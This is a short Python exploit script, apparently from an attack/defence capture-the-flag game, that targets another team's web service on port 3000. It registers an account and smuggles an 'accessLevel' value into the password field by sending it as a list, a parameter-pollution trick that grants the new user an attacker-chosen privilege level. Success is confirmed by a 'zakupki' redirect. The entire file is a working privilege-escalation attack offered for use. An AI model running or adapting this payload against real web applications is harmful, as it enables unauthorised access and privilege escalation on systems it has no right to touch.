import sys

import requests


def register_with_access(url, username, level):
    sess = requests.session()
    password = "kek"
    r = sess.post(url + "/register", data={"username": username,
                                           "secret": "asdasda", "password": [password, "accessLevel", str(level)]})
    if "zakupki" in r.url:
        return (username, password, sess)
    else:
        return False


if __name__ == "__main__":
    team_ip = "http://" + sys.argv[1] + ":3000"
    user = sys.argv[2]
    access_level = sys.argv[3]

    print(register_with_access(team_ip, user, access_level))
